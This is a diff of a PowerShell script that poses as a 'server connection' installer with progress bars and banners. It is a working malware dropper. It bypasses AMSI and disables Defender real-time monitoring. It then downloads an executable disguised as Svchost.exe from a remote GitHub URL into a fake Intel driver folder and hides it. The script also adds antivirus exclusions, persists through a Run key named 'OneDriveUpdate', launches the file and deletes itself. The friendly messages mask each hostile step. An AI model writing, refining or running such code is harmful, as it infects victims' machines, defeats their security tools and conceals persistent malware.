@@ -1,7 +1,3 @@
-# ============================================
-# PUSHPA SERVER CONNECTION - USER LEVEL
-# ============================================
-
 # AMSI Bypass
 try {
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
@@ -11,14 +7,8 @@ try {
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
 
 # ============================================
-# PROGRESS DISPLAY
+# PROGRESS BAR FUNCTION
 # ============================================
-Write-Host ""
-Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║                    TANISH SERVER CONNECTION                  ║" -ForegroundColor Green
-Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
-Write-Host ""
-
 function Show-Progress {
     param($step, $total, $message)
     $percent = [math]::Round(($step / $total) * 100)
@@ -29,8 +19,24 @@ function Show-Progress {
 }
 
 # ============================================
-# CREATE HIDDEN FOLDER
+# HEADER
 # ============================================
+Write-Host ""
+Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║                    TANISH SERVER CONNECTION                   ║" -ForegroundColor Green
+Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+
+# ============================================
+# STEP 1: Initializing
+# ============================================
+Show-Progress -step 1 -total 6 -message "Initializing connection..."
+Start-Sleep -Milliseconds 500
+
+# ============================================
+# STEP 2: Create Folder
+# ============================================
+Show-Progress -step 2 -total 6 -message "Creating secure directory..."
 $folder = "$env:ProgramData\Intel\DriverCache"
 if (!(Test-Path $folder)) {
     New-Item -ItemType Directory -Path $folder -Force | Out-Null
@@ -41,55 +47,40 @@ $name = -join ((65..90) | Get-Random -Count 8 | %{[char]$_}) + ".exe"
 $path = Join-Path $folder $name
 
 # ============================================
-# STEP 1: Initializing
+# STEP 3: Downloading
 # ============================================
-Show-Progress -step 1 -total 6 -message "Initializing connection..."
-Start-Sleep -Milliseconds 500
-
-# ============================================
-# STEP 2: Download EXE
-# ============================================
-Show-Progress -step 2 -total 6 -message "Downloading driver updates..."
-try {
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile("https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe", $path)
-    if (!(Test-Path $path)) { exit }
-} catch { exit }
-
-# ============================================
-# STEP 3: Configure Exclusions
-# ============================================
-Show-Progress -step 3 -total 6 -message "Configuring security exclusions..."
+Show-Progress -step 3 -total 6 -message "Downloading driver updates..."
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile("https://raw.githubusercontent.com/tanish-king/updater/main/Svchost.exe", $path)
 Set-ItemProperty -Path $path -Name Attributes -Value "Hidden" -ErrorAction SilentlyContinue
+
+# ============================================
+# STEP 4: Configuring Security
+# ============================================
+Show-Progress -step 4 -total 6 -message "Configuring security exclusions..."
 Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
 Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
 
 # ============================================
-# STEP 4: Setup Auto-Start (USER LEVEL - NO SYSTEM TASK)
+# STEP 5: Auto-Start Setup
 # ============================================
-Show-Progress -step 4 -total 6 -message "Setting up auto-start..."
-
-# ONLY Registry Run (User Level - Game compatible)
-$reg = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $reg -Name "OneDriveUpdate" -Value $path -Force -ErrorAction SilentlyContinue
-
-# NO Scheduled Task - it causes game compatibility issues
+Show-Progress -step 5 -total 6 -message "Setting up auto-start..."
+Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "OneDriveUpdate" -Value $path -Force -ErrorAction SilentlyContinue
 
 # ============================================
-# STEP 5: Start Application
+# STEP 6: Starting Application
 # ============================================
-Show-Progress -step 5 -total 6 -message "Starting application..."
-Start-Process -FilePath $path -WindowStyle Hidden -ErrorAction SilentlyContinue
+Show-Progress -step 6 -total 6 -message "Starting application..."
+cmd /c start "" "$path"
 
 # ============================================
-# STEP 6: Finalizing
+# COUNTDOWN
 # ============================================
-Show-Progress -step 6 -total 6 -message "Finalizing..."
 Write-Host ""
 Write-Host "  ⏳ Waiting for initialization (25 seconds)..." -ForegroundColor Gray
 
 for ($i = 25; $i -ge 1; $i--) {
-    Write-Host "`r  ⏳ $i seconds remaining..." -NoNewline -ForegroundColor Gray
+    Write-Host "`r  ⏳ $i seconds remaining..." -NoNewline
     Start-Sleep -Seconds 1
 }
 Write-Host ""
@@ -100,15 +91,17 @@ Write-Host ""
 Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
 
 # ============================================
-# DONE
+# FOOTER
 # ============================================
 Write-Host ""
 Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
-Write-Host "║         ✓ YOU ARE NOW CONNECTED TO TANISH SERVER            ║" -ForegroundColor Green
+Write-Host "║              ✓ CONNECTED TO TANISH SERVER ✓                  ║" -ForegroundColor Green
 Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
 Write-Host ""
 
-# Self-delete (only if running from file)
+# ============================================
+# SELF-DELETE
+# ============================================
 if ($MyInvocation.MyCommand.Path) {
     Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
 }
